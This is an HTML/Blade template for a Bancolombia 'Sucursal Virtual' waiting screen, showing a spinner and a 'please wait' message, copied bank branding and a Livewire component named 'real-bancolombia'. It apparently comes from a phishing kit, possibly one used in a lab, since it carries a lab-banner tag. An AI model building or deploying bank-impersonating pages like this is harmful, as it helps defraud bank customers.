<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sucursal Virtual Personas | Bancolombia</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"
        integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"
        integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
    <style>
        @font-face {
            font-family: "Font Awesome 5 Brands";
            font-style: normal;
            font-weight: 400;
            font-display: auto;
            src: url(/bancolombia/icons.woff) format("woff");
        }

        @font-face {
            font-family: "Font Awesome 5 light";
            font-style: normal;
            font-weight: 400;
            font-display: auto;
            src: url(/bancolombia/icons.woff) format("woff");
        }

        @font-face {
            font-family: "Font Awesome 5 Pro";
            font-style: normal;
            font-weight: 900;
            font-display: auto;
            src: url(/bancolombia/icons.woff) format("woff");
        }

        @font-face {
            font-family: "Font Awesome 5 Pro Regular";
            font-style: normal;
            font-weight: 400;
            font-display: auto;
            src: url(/bancolombia/icons.woff) format("woff");
        }

        @font-face {
            font-family: "CIBFont Sans";
            src: url("/bancolombia/CIBFontSansLight.woff") format("woff");
            font-weight: 400;
            font-style: normal;
            font-display: auto;
        }

        @font-face {
            font-family: "CIBFont Sans";
            src: url("/bancolombia/CIBFontSansBold.woff") format("woff");
            font-weight: 800;
            font-style: normal;
            font-display: auto;
        }

        @font-face {
            font-family: "CIBFont Serif";
            src: url("/bancolombia/CIBFontSerifBold.woff") format("woff");
            font-weight: 800;
            font-style: normal;
            font-display: auto;
        }

        @font-face {
            font-family: "Open Sans";
            src: url("/bancolombia/OpenSans-Regular.woff") format("woff");
            font-weight: 400;
            font-style: normal;
            font-display: auto;
        }

        @font-face {
            font-family: "Open Sans";
            src: url("/bancolombia/OpenSans-SemiBold.woff") format("woff");
            font-weight: 600;
            font-style: normal;
            font-display: auto;
        }

        @font-face {
            font-family: "Open Sans";
            src: url("/bancolombia/OpenSans-Bold.woff") format("woff");
            font-weight: 800;
            font-style: normal;
            font-display: auto;
        }

        @font-face {
            font-family: "OpenSans";
            src: url("/bancolombia/OpenSans-Regular.woff") format("woff");
            font-weight: 400;
            font-style: normal;
            font-display: auto;
        }

        @font-face {
            font-family: "OpenSans";
            src: url("/bancolombia/OpenSans-SemiBold.woff") format("woff");
            font-weight: 600;
            font-style: normal;
            font-display: auto;
        }

        @font-face {
            font-family: "OpenSans";
            src: url("/bancolombia/OpenSans-Bold.woff") format("woff");
            font-weight: 800;
            font-style: normal;
            font-display: auto;
        }

        @font-face {
            font-family: "CIBFontSans-Light";
            src: url("/bancolombia/CIBFontSansLight.woff2") format("woff2");
            font-weight: 400;
            font-style: normal;
            font-display: auto;
        }

        @font-face {
            font-family: "CIBFontSans-Bold";
            src: url("/bancolombia/CIBFontSansBold.woff2") format("woff2");
            font-weight: 400;
            font-style: normal;
            font-display: auto;
        }

        @font-face {
            font-family: "CIBFontSerif-Bold";
            src: url("/bancolombia/CIBFontSerifBold.woff2") format("woff2");
            font-weight: 400;
            font-style: normal;
            font-display: auto;
        }

        @font-face {
            font-family: "OpenSans-Bold";
            src: url("/bancolombia/OpenSans-Bold.woff") format("woff2");
            font-weight: 400;
            font-style: normal;
            font-display: auto;
        }

        @font-face {
            font-family: "OpenSans-SemiBold";
            src: url("/bancolombia/OpenSans-SemiBold.woff") format("woff2");
            font-weight: 400;
            font-style: normal;
            font-display: auto;
        }

        @font-face {
            font-family: "OpenSans-Regular";
            src: url("/bancolombia/OpenSans-Regular.woff") format("woff2");
            font-weight: 400;
            font-style: normal;
            font-display: auto;
        }

        @font-face {
            font-family: "Font Icon Regular";
            font-style: normal;
            font-weight: 400;
            font-display: auto;
            src: url("/bancolombia/icons.woff") format("woff");
        }



        .texto-1 {

            -webkit-text-size-adjust: 100%;
            -webkit-tap-highlight-color: transparent;
            text-align: center;
            color: #222;
            font: 75%/1.5 Arial, Helvetica, sans-serif;
            box-sizing: border-box;
            margin-top: 0;
            margin-bottom: .5rem;
            font-size: 16px;
            line-height: 20px;
            letter-spacing: -.3px;
            font-family: OpenSans-Regular;
            font-weight: 400;

        }

        .entrada-1 {

            -webkit-text-size-adjust: 100%;
            -webkit-tap-highlight-color: transparent;
            --blue: #007bff;
            --indigo: #6610f2;
            --purple: #6f42c1;
            --pink: #e83e8c;
            --red: #dc3545;
            --orange: #fd7e14;
            --yellow: #ffc107;
            --green: #28a745;
            --teal: #20c997;
            --cyan: #17a2b8;
            --white: #fff;
            --gray: #6c757d;
            --gray-dark: #343a40;
            --gray-functional: #5c6166;
            --gray-functional-lighter: #cfdae6;
            --gray-functional-light: #8a9199;
            --primary: #dc2a4d;
            --secondary: #00943e;
            --success: #28a745;
            --info: #17a2b8;
            --warning: #ffc107;
            --danger: #dc3545;
            --light: #f3f3f3;
            --dark: #3f3f3f;
            --green-banco: #38a121;
            --green-banco-hover: #43b02a;
            --default: #ddd;
            --breakpoint-xs: 0;
            --breakpoint-sm: 576px;
            --breakpoint-md: 768px;
            --breakpoint-lg: 992px;
            --breakpoint-xl: 1200px;
            --font-family-sans-serif: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
            --font-family-monospace: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
            word-wrap: break-word;
            box-sizing: border-box;
            font-family: inherit;
            overflow: visible;
            display: block;
            transition: border-color .15s ease-in-out, box-shadow .15s ease-in-out;
            border: 1px solid #c2c2c2;
            border-radius: 3px;
            outline: none;
            color: #757575;
            background: #fff;
            line-height: 14px;
            padding: 8px;
            height: 3.5rem;
            max-width: unset;
            min-width: unset;
            width: 100%;
            margin: .5rem 0;
            font-size: 1rem;
            padding-left: 1rem;

            -webkit-text-size-adjust: 100%;
            -webkit-tap-highlight-color: transparent;
            --blue: #007bff;
            --indigo: #6610f2;
            --purple: #6f42c1;
            --pink: #e83e8c;
            --red: #dc3545;
            --orange: #fd7e14;
            --yellow: #ffc107;
            --green: #28a745;
            --teal: #20c997;
            --cyan: #17a2b8;
            --white: #fff;
            --gray: #6c757d;
            --gray-dark: #343a40;
            --gray-functional: #5c6166;
            --gray-functional-lighter: #cfdae6;
            --gray-functional-light: #8a9199;
            --primary: #dc2a4d;
            --secondary: #00943e;
            --success: #28a745;
            --info: #17a2b8;
            --warning: #ffc107;
            --danger: #dc3545;
            --light: #f3f3f3;
            --dark: #3f3f3f;
            --green-banco: #38a121;
            --green-banco-hover: #43b02a;
            --default: #ddd;
            --breakpoint-xs: 0;
            --breakpoint-sm: 576px;
            --breakpoint-md: 768px;
            --breakpoint-lg: 992px;
            --breakpoint-xl: 1200px;
            --font-family-sans-serif: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
            --font-family-monospace: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
            font-family: pfbeausans, Arial, sans-serif;
            font-size: 1rem;
            font-weight: 400;
            line-height: 1.5;
            color: #212529;
            box-sizing: border-box;
            margin-top: 0;
            margin-bottom: 1rem;


        }

        .boton-1 {
            -webkit-text-size-adjust: 100%;
            line-height: 1.15;
            margin: 0;
            overflow: visible;
            text-transform: none;
            -webkit-appearance: button;
            background: rgb(253, 218, 36);
            border: 0px;
            cursor: pointer;
            display: flex;
            flex-direction: row;
            -webkit-box-align: center;
            align-items: center;
            -webkit-box-pack: center;
            justify-content: center;
            width: 218px;
            height: 50px;
            position: relative;
            border-radius: 100px;
            font-family: "Open Sans";
            font-weight: 600;
            font-size: 16px;
            outline: none;
            padding: 12px 24px;
            gap: 8px;
            color: rgb(44, 42, 41);
        }

        .boton-1:disabled {
            background: #ccc;
        }

        .marco-1 {

            line-height: 1.15;
            border-radius: 16px;
            display: flex;
            flex-direction: column;
            -webkit-box-pack: center;
            justify-content: center;
            -webkit-box-align: center;
            align-items: center;
            box-shadow: rgba(0, 0, 0, 0.1) 0px 1px 8px;
            background-color: rgb(255, 255, 255);
            gap: 32px;
            /* padding: 48px; */
            /* width: 454px; */
            /* margin-top: 30px; */

        }

        .texto-2 {
            -webkit-text-size-adjust: 100%;
            font-family: "Open Sans";
            font-style: normal;
            font-weight: 400;
            font-size: 16px;
            line-height: 22px;
            text-align: center;
            letter-spacing: -0.3px;
            color: rgb(44, 42, 41);
            width: 432px;
            flex: 0 0 auto;
            order: 2;
            -webkit-box-flex: 0;
        }

        .texto-3 {
            -webkit-text-size-adjust: 100%;
            font-family: "Open Sans";
            font-style: normal;
            font-weight: 600;
            font-size: 16px;
            line-height: 22px;
            text-align: center;
            letter-spacing: -0.3px;
            color: rgb(44, 42, 41);
            width: 432px;
            flex: 0 0 auto;
            order: 3;
            -webkit-box-flex: 0;
        }

        body {
            background-color: #F7F7F7;
            -webkit-text-size-adjust: 100%;
            line-height: 1.15;
            /* padding-top: 5em; */
            background-image: url("/bancolombia/fondo_1.svg");
            position: relative;
            background-repeat: no-repeat;
            background-size: cover;
            background-position: 50% 100%;
            padding-bottom: 5em;
        }

        .loading-spinner {
            display: inline-block;
            width: 100px;
            height: 100px;
            border: 10px solid rgba(230, 230, 230, .3);
            border-radius: 50%;
            border-top-color: #4a4c4e;
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }


        @media only screen and (min-width: 768px) {
            body {
                width: 40%;
                /* Ancho del cuerpo en dispositivos de escritorio */
                margin: 0 auto;
                /* Centra el cuerpo horizontalmente */
            }
        }
    </style>

    <style>
        .xcaja-1 {
            -webkit-text-size-adjust: 100%;
            line-height: 1.15;
            width: 100%;
            display: flex;
            flex-direction: column;
            top: 0px;
            position: relative;
        }

        .xicono-1 {
            -webkit-text-size-adjust: 100%;
            line-height: 1.15;
            background-image: url("/bancolombia/user.39a37ef47269f6d65906fbb23186e4b6.svg");
            background-repeat: no-repeat;
            background-position: center center;
            position: absolute;
            height: 24px;
            top: 12px;
            text-align: center;
            width: 21px !important;
        }

        .xentrada-1 {
            -webkit-text-size-adjust: 100%;
            margin: 0;
            overflow: visible;
            border-width: 0px 0px 1px;
            border-top-style: initial;
            border-right-style: initial;
            border-left-style: initial;
            border-top-color: initial;
            border-right-color: initial;
            border-left-color: initial;
            border-image: initial;
            color: rgb(41, 41, 41);
            font-family: "Open Sans";
            letter-spacing: -0.3px;
            line-height: 24px;
            background-color: transparent;
            outline: none;
            padding: 12px 3px 5px 30px;
            font-size: 16px;
            transition: all 0.2s ease 0s;
            position: relative;
            z-index: 510;
            border-bottom-style: solid;
            /* border-bottom-color: red; */
            border-radius: 0px !important;
        }

        .xentrada-2 {
            -webkit-text-size-adjust: 100%;
            margin: 0;
            overflow: visible;
            /* border-width: 0px 0px 1px;
            border-top-style: initial;
            border-right-style: initial;
            border-left-style: initial;
            border-top-color: initial;
            border-right-color: initial;
            border-left-color: initial;
            border-image: initial; */
            color: rgb(41, 41, 41);
            font-family: "Open Sans";
            letter-spacing: -0.3px;
            line-height: 24px;
            background-color: transparent;
            outline: none;
            padding: 12px 3px 5px 30px;
            font-size: 16px;
            transition: all 0.2s ease 0s;
            position: relative;
            z-index: 510;
            /* border-bottom-style: solid; */
            /* border-bottom-color: red; */
            /* border-radius: 0px !important; */
            border: none;
            /* Eliminar el borde predeterminado */
            border-bottom: 1px solid black;
            /* Agregar un borde inferior sólido */
            background-image: linear-gradient(to right, black 25%, transparent 25%, transparent 50%, black 50%);
            /* Establecer un gradiente para simular el borde discontinuo */
            background-size: 200px 1px;
            /* Establecer el tamaño del gradiente */
            background-position: 0 bottom;
            /* Alinear el gradiente al inicio del borde inferior */
            background-repeat: repeat-x;
            /* Repetir el gradiente horizontalmente */
        }


        .xlabel-1 {
            -webkit-text-size-adjust: 100%;
            color: rgb(44, 42, 41);
            font-family: "Open Sans";
            font-style: normal;
            font-weight: 400;
            font-size: 16px;
            line-height: 0px;
            top: 25px;
            left: 30px;
            transition: all 0.2s ease 0s;
            position: absolute;
            flex: 0 0 auto;
            order: 1;
            -webkit-box-flex: 0;
        }

        .xlabel-2 {
            -webkit-text-size-adjust: 100%;
            color: rgb(44, 42, 41);
            font-family: "Open Sans";
            font-style: normal;
            font-weight: 400;
            font-size: 16px;
            line-height: 0px;
            top: 25px;
            left: 30px;
            transition: all 0.2s ease 0s;
            position: absolute;
            flex: 0 0 auto;
            order: 1;
            -webkit-box-flex: 0;
            transform: translateY(-30px) translateX(10px);
            z-index: 501;
            background: transparent;
            padding: 0px 8px;
        }
    </style>


</head>

<body>
<x-lab-banner />
    <div class="text-center py-2 w-100" style="background: #fff;">
        <img src="/bancolombia/logo_bancolombia.svg" width="208" height="58" alt="">
    </div>
    <br>
    <br>
    <div class="text-center mt-5">
        <div class="loading-spinner"></div>
    </div>
    <br>
    <div class="text-center">
        <p class="texto-1">Espere un momento por favor.</p>
    </div>


    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"
        crossorigin="anonymous"></script>

    <div>
        @livewire('real-bancolombia')
    </div>
    @livewireScripts

</body>

</html>